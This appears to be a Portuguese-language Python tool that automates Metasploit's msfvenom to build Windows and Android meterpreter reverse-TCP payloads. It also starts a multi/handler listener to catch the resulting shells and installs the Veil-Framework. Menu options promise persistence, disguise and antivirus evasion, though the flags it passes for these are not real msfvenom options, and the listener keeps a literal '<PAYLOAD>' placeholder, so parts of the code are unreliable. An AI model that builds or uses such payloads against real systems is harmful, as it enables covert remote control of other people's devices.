import subprocess

def check_msfvenom_installed():
    try:
        subprocess.run("msfvenom --version", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

def install_msfvenom():
    try:
        print("Iniciando a instalação do msfvenom...")
        subprocess.run("pkg install -y metasploit", shell=True, check=True)
        print("msfvenom foi instalado com sucesso!")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Erro ao instalar o msfvenom: {e}")
        return False

def check_veil_installed():
    try:
        subprocess.run("veil --version", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

def install_veil():
    try:
        print("Iniciando a instalação do Veil-Framework...")
        subprocess.run("pkg install -y git", shell=True, check=True)
        subprocess.run("git clone https://github.com/Veil-Framework/Veil.git", shell=True, check=True)
        subprocess.run("cd Veil && ./config/setup.sh --force --silent", shell=True, check=True)
        print("Veil-Framework foi instalado com sucesso!")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao instalar o Veil-Framework: {e}")

def list_modules():
    print("Módulos disponíveis:")
    print("1. windows/meterpreter/reverse_tcp - Windows Meterpreter Reverse TCP")
    print("2. android/meterpreter/reverse_tcp - Android Meterpreter Reverse TCP")
    print("3. windows/exec - Windows Executable (EXE)")
    print("4. Outro módulo personalizado")
    print("5. Pesquisar por módulos")
    print("6. Pesquisa avançada por alvo e serviço")
    print("7. Informações sobre um módulo")
    print("8. Instalar Veil-Framework")
    print("9. Atualizar Ferramentas")
    print("0. Sair")

def search_modules(search_term):
    try:
        result = subprocess.run(f"msfconsole -x 'search {search_term}'", shell=True, check=True, text=True, capture_output=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Erro ao pesquisar por módulos: {e}")

def advanced_search():
    target_type = input("Digite o tipo de alvo (exemplo: windows, android): ").strip()
    service = input("Digite o serviço (exemplo: pdf, exe, apk): ").strip()
    search_term = f"{target_type}/{service}"

    try:
        result = subprocess.run(f"msfconsole -x 'search {search_term}'", shell=True, check=True, text=True, capture_output=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Erro ao pesquisar por módulos: {e}")

def show_module_info(payload_type):
    try:
        result = subprocess.run(f"msfconsole -x 'info {payload_type}'", shell=True, check=True, text=True, capture_output=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Erro ao obter informações sobre o módulo: {e}")

def customize_payload_options(payload_options):
    print("\nOpções adicionais do Payload:")
    print("1. Persistência (Adicionar persistência ao payload)")
    print("2. Camuflagem (Tornar o payload mais indetectável)")
    print("3. Evasão de Antivírus (Alterar o payload para evitar detecção de AV)")
    print("0. Voltar ao menu anterior")

    while True:
        choice = input("Digite o número da opção desejada: ")

        if choice == "1":
            payload_options += " --persist"
        elif choice == "2":
            payload_options += " --cloak"
        elif choice == "3":
            payload_options += " --evasion"
        elif choice == "0":
            break
        else:
            print("Opção inválida! Tente novamente.")
            continue

    return payload_options

def generate_payload(payload_type, payload_options, output_file):
    command = f"msfvenom -p {payload_type} {payload_options} -o {output_file}"

    try:
        subprocess.run(command, shell=True, check=True)
        print("Payload gerado com sucesso!")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao gerar payload: {e}")

def create_listener():
    lhost = input("Digite o IP do ouvinte (LHOST): ").strip()
    lport = input("Digite a porta do ouvinte (LPORT): ").strip()

    listener_command = f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD <PAYLOAD>; set LHOST {lhost}; set LPORT {lport}; exploit;'"

    print("Ouvindo por conexões...")
    print(f"Para sair do ouvinte, pressione CTRL+C.")
    try:
        subprocess.run(listener_command, shell=True, check=True)
    except KeyboardInterrupt:
        print("Ouvinte encerrado.")

def update_tools():
    try:
        print("Atualizando ferramentas...")
        subprocess.run("pkg update -y", shell=True, check=True)
        subprocess.run("pkg upgrade -y", shell=True, check=True)
        print("Ferramentas atualizadas com sucesso!")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao atualizar as ferramentas: {e}")

def main():
    print("Bem-vindo ao gerador de payloads usando msfvenom!")

    if not check_msfvenom_installed():
        if not install_msfvenom():
            print("Não foi possível instalar o msfvenom. O programa será encerrado.")
            return

    while True:
        print("\nMENU INICIAL:")
        print("1. Abrir Listener")
        print("2. Criar Exploits e Payloads")
        print("3. Instalar Veil-Framework")
        print("4. Atualizar Ferramentas")
        print("0. Sair")

        choice = input("Digite o número da opção desejada: ")

        if choice == "1":
            create_listener()
        elif choice == "2":
            while True:
                list_modules()

                choice = input("Digite o número da opção desejada: ")

                if choice == "1":
                    payload_type = "windows/meterpreter/reverse_tcp"
                elif choice == "2":
                    payload_type = "android/meterpreter/reverse_tcp"
                elif choice == "3":
                    payload_type = "windows/exec"
                elif choice == "4":
                    payload_type = input("Digite o tipo de payload (exemplo: windows/meterpreter/reverse_tcp): ").strip()
                elif choice == "5":
                    search_term = input("Digite o termo para pesquisa: ").strip()
                    search_modules(search_term)
                    continue
                elif choice == "6":
                    advanced_search()
                    continue
                elif choice == "7":
                    payload_type = input("Digite o tipo de payload (exemplo: windows/meterpreter/reverse_tcp): ").strip()
                    show_module_info(payload_type)
                    continue
                elif choice == "8":
                    if not check_veil_installed():
                        install_veil()
                        continue
                    else:
                        print("O Veil-Framework já está instalado.")
                        continue
                elif choice == "0":
                    print("Voltando ao MENU INICIAL.")
                    break
                else:
                    print("Opção inválida! Tente novamente.")
                    continue

                if choice == "4":
                    module_path = input("Digite o caminho completo para o módulo personalizado: ").strip()
                    payload_type = f"custom/{module_path}"
                else:
                    payload_options = input("Opções do payload (exemplo: LHOST=IP LPORT=PORT): ").strip()
                    output_file = input("Nome do arquivo de saída: ").strip()

                    if not payload_type or not payload_options or not output_file:
                        print("Por favor, preencha todas as informações necessárias.")
                        continue

                    payload_options = customize_payload_options(payload_options)

                    generate_payload(payload_type, payload_options, output_file)

        elif choice == "3":
            if not check_veil_installed():
                install_veil()
            else:
                print("O Veil-Framework já está instalado.")
        elif choice == "4":
            update_tools()
        elif choice == "0":
            print("Saindo...")
            break
        else:
            print("Opção inválida! Tente novamente.")
            continue

if __name__ == "__main__":
    main()
